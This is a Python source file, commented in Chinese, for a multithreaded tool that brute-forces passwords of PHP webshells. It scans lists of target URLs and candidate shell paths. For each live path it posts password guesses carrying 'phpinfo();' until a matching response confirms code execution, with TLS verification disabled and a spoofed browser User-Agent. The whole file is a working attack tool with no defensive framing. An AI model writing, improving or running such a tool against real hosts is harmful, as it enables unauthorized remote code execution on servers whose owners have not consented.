# -*- coding:UTF-8 -*-
"""
Author: 定制化改造
Name: PHP Webshell POST爆破工具（最终版）
修复：Ctrl+C 无法退出 + 进度条卡住 + 线程强制终止
"""
import re
import requests
import os
import sys
import threading
import time
import signal
from queue import Queue, Empty
from typing import List, Dict, Optional
from urllib.parse import urljoin
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# 核心配置
TIMEOUT = 3                 # 极致缩短超时，减少线程阻塞
MAX_THREADS = 20            # 最大线程数
PROGRESS_BAR_LEN = 50       # 进度条长度
PROGRESS_REFRESH_INTERVAL = 0.1
USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'

# PHPINFO特征
PHPINFO_PATTERN = re.compile(
    r'<title>phpinfo\(\)</title>|<h1 class="p">PHP Version \d+\.\d+\.\d+</h1>|<th class="e">PHP Configuration</th>',
    re.IGNORECASE
)

# 默认字典路径
DEFAULT_URL_FILE = "./urls.txt"
DEFAULT_SHELL_FILE = "./shell.txt"
DEFAULT_PASS_FILE = "./pass.txt"

# 全局变量（线程安全 + 退出标志）
lock = threading.Lock()
found_password = None       # 正确密码
total_tried = 0             # 已尝试数
total_passwords = 0         # 总密码数
shell_url_target = ""       # 当前爆破URL
progress_thread = None      # 进度刷新线程
progress_stop_flag = False  # 进度线程停止标志
global_exit_flag = False    # 全局退出标志（Ctrl+C触发）
threads = []                # 保存所有工作线程引用，便于强制终止

# -------------------------- 信号处理：捕获 Ctrl+C --------------------------
def signal_handler(signum, frame):
    """捕获 SIGINT (Ctrl+C) 信号，强制退出"""
    global global_exit_flag, found_password, progress_stop_flag
    with lock:
        global_exit_flag = True
        found_password = "INTERRUPTED"
        progress_stop_flag = True
        print(f"\n\n[⚠️ 接收到 Ctrl+C 中断信号] 正在强制终止所有线程...")
        print(f"[中断状态] 已尝试密码：{total_tried}/{total_passwords}")
    
    # 强制终止所有工作线程（daemon线程也需要主动退出）
    for t in threads:
        if t.is_alive():
            # 线程无法直接kill，通过全局标志让线程自行退出
            pass
    
    # 终止进度线程
    if progress_thread and progress_thread.is_alive():
        progress_thread.join(timeout=0.5)
    
    # 强制退出程序
    sys.exit(0)

# 注册信号处理（必须在主线程启动时注册）
signal.signal(signal.SIGINT, signal_handler)

# -------------------------- 基础工具函数 --------------------------
def create_retry_session() -> requests.Session:
    """创建轻量会话（无重试、短超时）"""
    session = requests.Session()
    adapter = HTTPAdapter(max_retries=Retry(total=0))
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session

def load_dict(file_path: str) -> List[str]:
    """加载字典（严格去空/去重）"""
    if not os.path.exists(file_path):
        print(f"[错误] 字典文件不存在：{file_path}")
        return []
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [line.strip() for line in f if line.strip()]
            unique_lines = list(set(lines))
            print(f"[字典加载] {file_path} → 原始：{len(lines)} | 去重：{len(unique_lines)}")
            return unique_lines
    except Exception as e:
        print(f"[错误] 加载字典失败：{e}")
        return []

def format_url(raw_url: str) -> str:
    """格式化URL"""
    raw_url = raw_url.strip()
    if not raw_url.startswith(('http://', 'https://')):
        raw_url = f'http://{raw_url}'
    if not raw_url.endswith('/'):
        raw_url += '/'
    return raw_url

def progress_refresher():
    """独立进度刷新线程（不受worker阻塞影响）"""
    global progress_stop_flag, total_tried, total_passwords, global_exit_flag
    while not progress_stop_flag and not global_exit_flag:
        if total_passwords > 0 and not global_exit_flag:
            with lock:
                percent = f"{100 * (total_tried / total_passwords):.1f}"
                filled = int(PROGRESS_BAR_LEN * total_tried // total_passwords)
                bar = '█' * filled + '-' * (PROGRESS_BAR_LEN - filled)
                sys.stdout.write(
                    f'\r[爆破进度] |{bar}| {percent}% ({total_tried}/{total_passwords}) | 目标：{shell_url_target.split("/")[-1]}'
                )
                sys.stdout.flush()
        time.sleep(PROGRESS_REFRESH_INTERVAL)
    sys.stdout.write('\n')
    sys.stdout.flush()

# -------------------------- 多线程爆破核心 --------------------------
def worker(queue: Queue, headers: Dict[str, str], thread_id: int):
    """线程工作函数（响应全局退出标志）"""
    global found_password, total_tried, global_exit_flag
    session = create_retry_session()
    print(f"[线程启动] ID:{thread_id} → 队列剩余：{queue.qsize()}")

    # 优先检查全局退出标志，快速退出
    while not queue.empty() and found_password is None and not global_exit_flag:
        try:
            # 非阻塞获取密码，避免卡住
            try:
                pwd = queue.get(timeout=0.5)
            except Empty:
                continue
            if not pwd:
                queue.task_done()
                continue

            # 全局退出标志触发，立即终止
            if global_exit_flag:
                queue.task_done()
                break

            # 构建POST数据
            post_data = {pwd: "phpinfo();"}

            # 发送POST请求（极致超时）
            resp = session.post(
                shell_url_target,
                data=post_data,
                headers=headers,
                timeout=TIMEOUT,
                allow_redirects=False,
                verify=False,
                stream=False
            )

            # 验证phpinfo特征
            if PHPINFO_PATTERN.search(resp.text[:10000]):
                with lock:
                    found_password = pwd
                    print(f"\n\n[✅ 爆破成功] 线程{thread_id} | 密码：{pwd}")
                    print(f"[响应] HTTP {resp.status_code} | 长度：{len(resp.text)} 字节")
                break

        except Exception as e:
            # 仅打印关键异常，避免刷屏
            err_type = type(e).__name__
            if thread_id == 1 and not global_exit_flag:  # 仅1号线程打印
                with lock:
                    print(f"\n[⚠️ 线程{thread_id}] 密码：{pwd[:10]}... | 异常：{err_type}")
        finally:
            # 无论如何都计数+标记任务完成
            if 'pwd' in locals():
                with lock:
                    total_tried += 1
                queue.task_done()

    # 线程退出日志
    print(f"[线程结束] ID:{thread_id} → 全局退出标志：{global_exit_flag}")
    session.close()

def brute_force_php_shell_multi_thread(shell_url: str, pass_list: List[str], headers: Dict[str, str]) -> bool:
    """多线程爆破（支持强制退出）"""
    global found_password, total_tried, total_passwords, shell_url_target
    global progress_stop_flag, progress_thread, threads, global_exit_flag

    # 重置全局变量
    found_password = None
    total_tried = 0
    total_passwords = len(pass_list)
    shell_url_target = shell_url
    progress_stop_flag = False
    threads = []  # 清空线程列表
    if global_exit_flag:
        return False

    print(f"\n[爆破启动] 目标：{shell_url} | 密码数：{total_passwords} | 线程数：{MAX_THREADS}")
    if total_passwords == 0:
        print("[失败] 密码字典为空")
        return False

    # 启动独立进度线程
    progress_thread = threading.Thread(target=progress_refresher, daemon=True)
    progress_thread.start()

    # 创建密码队列
    password_queue = Queue()
    for pwd in pass_list:
        password_queue.put(pwd)

    # 启动工作线程
    thread_count = min(MAX_THREADS, total_passwords)
    for i in range(thread_count):
        if global_exit_flag:
            break
        t = threading.Thread(target=worker, args=(password_queue, headers, i+1))
        t.daemon = True  # 守护线程，主线程退出时自动终止
        t.start()
        threads.append(t)
        time.sleep(0.01)  # 微错开启动，避免网络拥堵

    # 非阻塞监控队列（替代阻塞的queue.join()）
    try:
        while not global_exit_flag and found_password is None:
            if password_queue.unfinished_tasks == 0:
                break
            time.sleep(0.1)  # 每0.1秒检查一次，不阻塞
    except Exception:
        pass

    # 停止进度线程
    progress_stop_flag = True
    if progress_thread.is_alive():
        progress_thread.join(timeout=1)

    # 等待所有线程退出（最多等2秒）
    for t in threads:
        t.join(timeout=2)

    # 输出结果
    if global_exit_flag:
        print(f"\n[强制退出] 已尝试：{total_tried}/{total_passwords}")
        return False
    elif found_password:
        return True
    else:
        print(f"\n[❌ 爆破失败] 尝试所有{total_passwords}个密码，未匹配到phpinfo()")
        return False

# -------------------------- 主流程 --------------------------
def main():
    print("===== PHP Webshell 多线程POST爆破工具（支持Ctrl+C退出） =====\n")
    print(f"核心配置：线程数={MAX_THREADS} | 请求超时={TIMEOUT}秒\n")
    
    # 读取用户输入
    url_file = input(f"URL列表路径（默认：{DEFAULT_URL_FILE}）：").strip() or DEFAULT_URL_FILE
    shell_file = input(f"Shell路径字典（默认：{DEFAULT_SHELL_FILE}）：").strip() or DEFAULT_SHELL_FILE
    pass_file = input(f"密码字典路径（默认：{DEFAULT_PASS_FILE}）：").strip() or DEFAULT_PASS_FILE

    # 加载字典
    print("\n[加载字典] --------------------------")
    url_list = load_dict(url_file)
    shell_list = load_dict(shell_file)
    pass_list = load_dict(pass_file)

    # 校验字典
    errors = []
    if not url_list:
        errors.append(f"URL文件无效：{url_file}")
    if not shell_list:
        errors.append(f"Shell字典无效：{shell_file}")
    if not pass_list:
        errors.append(f"密码字典无效：{pass_file}")
    if errors:
        print("[错误] 字典校验失败：")
        for err in errors:
            print(f"  - {err}")
        return

    # 请求头配置
    headers = {
        'User-Agent': USER_AGENT,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'close'
    }

    # 禁用SSL警告
    requests.packages.urllib3.disable_warnings()

    # 批量扫描
    print("\n[扫描目标] --------------------------")
    for raw_url in url_list:
        if global_exit_flag:
            break
        base_url = format_url(raw_url)
        print(f"\n[检测目标] {base_url}")
        for shell_path in shell_list:
            if global_exit_flag:
                break
            shell_url = urljoin(base_url, shell_path)
            if not shell_url.endswith('.php'):
                print(f"[跳过] 非PHP文件：{shell_url}")
                continue

            # 前置检测Shell存活
            session = create_retry_session()
            try:
                resp = session.get(
                    shell_url,
                    headers=headers,
                    timeout=TIMEOUT,
                    verify=False,
                    allow_redirects=False
                )
                if resp.status_code == 200 and "404 Not Found" not in resp.text:
                    print(f"[存活] {shell_url} → 启动爆破")
                    brute_force_php_shell_multi_thread(shell_url, pass_list, headers)
                else:
                    print(f"[未存活] {shell_url} (HTTP {resp.status_code})")
            except Exception as e:
                print(f"[检测异常] {shell_url} → {type(e).__name__}: {str(e)[:20]}")
            finally:
                session.close()

    # 最终退出提示
    if global_exit_flag:
        print("\n[程序已强制退出]")
    else:
        print("\n[扫描完成] 所有目标处理完毕")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"\n[程序异常退出] 原因：{e}")
    finally:
        sys.exit(0)